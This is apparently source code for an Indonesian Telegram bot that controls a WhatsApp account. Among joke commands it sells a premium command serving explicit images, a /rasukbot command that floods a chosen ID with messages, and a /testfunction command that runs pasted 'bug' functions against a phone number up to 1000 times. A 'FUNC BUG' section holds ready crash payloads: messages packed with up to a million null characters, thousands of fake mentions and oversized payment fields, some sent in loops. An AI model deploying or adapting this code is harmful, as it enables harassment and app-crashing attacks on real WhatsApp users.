startSesi();
} catch (error) {
await ctx.reply('❌ Gagal menghapus session!');
}
});

// Command untuk pairing WhatsApp
bot.command("addbot", checkOwner, checkGroupOnly, async (ctx) => {
const args = ctx.message.text.split(" ");
const userId = ctx.from.id;
if (args.length < 2) {
return await ctx.reply("❌ Format perintah salah. Gunakan: /addbot <628xxx>");
}

let phoneNumber = args[1];
phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


if (xerxes && xerxes.user) {
return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
}

try {
const code = await xerxes.requestPairingCode(phoneNumber, "SASKEBOS");
const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

const pairingMessage = `
\`\`\`Succesfully
Kode Pairing Kamu

Sender : ${phoneNumber}
Code : ${formattedCode}\`\`\`
`;

await ctx.replyWithMarkdown(pairingMessage);
} catch (error) {
console.error(chalk.red('Gagal melakukan pairing:'), error);
await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
}
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
pm2.connect((err) => {
if (err) {
console.error('Gagal terhubung ke PM2:', err);
return;
}

pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
pm2.disconnect(); // Putuskan koneksi setelah restart
if (err) {
console.error('Gagal merestart bot:', err);
} else {
console.log('Bot berhasil direstart.');
}
});
});
};

bot.command("iq", (ctx) => {
    const target = ctx.message.reply_to_message;
    if (!target) return ctx.reply("Reply orang yang mau di cek IQ.");

    const iq = Math.floor(Math.random() * 200);
    ctx.reply(`🧠 IQ dia adalah: ${iq}`);
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const input = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  // Jika hanya /rasukbot
  if (!input) {
    return ctx.replyWithHTML(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>"
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // MODE REPLY
    if (reply) {
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 3) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|pesan|jumlah</code> (reply pesan target)"
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // MODE MANUAL
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 4) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
        );
      }

      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithHTML(
        "❌ Format tidak valid!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 0; i < jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithHTML(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`
    );

  } catch (err) {
    await ctx.replyWithHTML(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`
    );
  }
});


  const quotes = [
    "Aku rela jadi yang kedua, asal kamu bahagia.",
    "Kamu tahu nggak? Kamu itu alasanku buka mata tiap pagi.",
    "Kalau cinta butuh pengorbanan, aku rela disakiti.",
    "Aku bukan yang terbaik, tapi aku akan berusaha jadi yang paling setia.",
    "Sayang, jangan pergi. Aku belum selesai mencintaimu.",
    "Kamu adalah alasan aku selalu tersenyum tiap hari.",
    "Cintaku kayak utang negara, nggak akan lunas sampai kapanpun.",
    "Kalau kamu bahagia sama dia, aku rela mundur walau hati hancur.",
    "Kalau cinta itu bodoh, maka aku bangga jadi yang paling bodoh.",
    "Cinta sejati itu bukan yang datang pertama, tapi yang bertahan sampai akhir.",
    "Setiap detik tanpamu itu siksaan.",
    "Aku ingin jadi alasan kamu bahagia, bukan alasan kamu terluka.",
    "Aku bucin karena kamu, bukan karena siapa-siapa.",
    "Kalau sayang bilang, jangan disimpan dalam diam.",
    "Jangan lelah mencintaiku, aku sedang belajar memperbaiki diri untukmu."
  ];
  bot.command("bucin", (ctx) => {
    const random = quotes[Math.floor(Math.random() * quotes.length)];
    ctx.reply(`💘 ${random}`);
  });

  const teks = [
    "Kadang, yang setia malah disia-siakan.",
    "Aku tersenyum, padahal hatiku hancur.",
    "Cinta tak selamanya indah, kadang menyakitkan.",
    "Aku rindu, tapi aku sadar aku bukan siapa-siapa.",
    "Jangan tanya kenapa aku diam, karena aku sudah lelah.",
    "Dulu kita dekat, sekarang hanya sisa kenangan.",
    "Aku mencintaimu, tapi kamu mencintainya.",
    "Kamu bahagia tanpaku, dan itu yang membuatku lebih sakit.",
    "Aku bertahan karena cinta, bukan karena tidak bisa pergi.",
    "Mereka bilang sabar, tapi hatiku sudah berdarah-darah.",
    "Terkadang, aku berharap tak pernah mengenalmu.",
    "Aku takut jatuh cinta lagi, karena sakitnya belum sembuh.",
    "Kamu ajari aku bahagia, lalu kamu pergi tinggalkan luka.",
    "Katanya cinta itu indah, kenapa aku selalu terluka?",
    "Aku sudah cukup kuat... sampai kamu datang lagi dengan luka baru."
  ];
  bot.command("sadboy", (ctx) => {
    ctx.reply(`😢 ${teks[Math.floor(Math.random() * teks.length)]}`);
  });

bot.command("gaymeter", (ctx) => {
    const percent = Math.floor(Math.random() * 101);
    ctx.reply(`🌈 Gaymeter kamu: ${percent}%`);
  }); 
  const kalimat = [
    "👻 Kamu merasa ada yang mengawasimu...",
    "😱 Bayangan hitam muncul di pojok ruangan.",
    "💀 Terdengar suara menyeramkan: 'Kembalikan bonekaku...'",
    "🕯️ Lilin tiba-tiba padam dan suhu menjadi dingin.",
    "🔪 Sosok putih berdiri di depan cermin.",
    "📞 Telepon berdering, tapi tak ada suara saat diangkat.",
    "📺 TV menyala sendiri dengan suara statik keras.",
    "🚪 Pintu kamar bergoyang sendiri di tengah malam.",
    "🩸 Ada jejak kaki basah padahal lantai kering.",
    "🪞 Cermin retak tanpa sebab, ada tulisan 'I see you'.",
    "🕳️ Kamu mendengar bisikan di telingamu.",
    "🩻 Tiba-tiba jantungmu berdetak cepat, entah kenapa.",
    "📸 Kamera menangkap sosok bayangan di belakangmu.",
    "📷 Foto lama berubah sendiri, ada sosok baru muncul.",
    "⛓️ Rantai besi berbunyi seperti diseret... semakin dekat."
  ];

bot.command("speed", async (ctx) => {
  const start = Date.now();
  await ctx.reply("⏱ Measuring...");
  const end = Date.now();
  ctx.reply(`⚡ Bot response: ${end - start} ms`);
});


bot.command("cuaca", async (ctx) => {
  const kota = ctx.message.text.split(" ").slice(1).join(" ");
  if (!kota) return ctx.reply("⚠️ Gunakan: /cuaca <kota>");

  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    ctx.reply(`🌤 Cuaca ${data}`);
  } catch {
    ctx.reply("⚠️ Tidak bisa mengambil data cuaca");
  }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: getRandomImage },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)


//~~~~~~~~~~~~~~~~~ FUNC BUG ~~~~~~~~~~~~~~~~~~\\
async function maling(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }

async function begal(sock, target) {
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }

async function sangek(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }

async function ngaceng(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }

async function FrezeeChat(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "饝噦饝喌饝喆饝喛".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'饝噦饝喌饝喆饝喛'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function dileycok(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(500000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function ngelayyy(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

//~~~~~~~~~~=~~~~~~ END FUNC ~~~===~~~~~~~~~~~~\\
// --- Jalankan Bot ---\\
(async () => {
    console.log(chalk.redBright.bold(`
  ╭─────────────────────────────╮        
  │\n${chalk.white('Memulai Sesi WhatsApp...')}  
  ╰─────────────────────────────╯`
     ));

    startSesi();
    bot.launch();
})();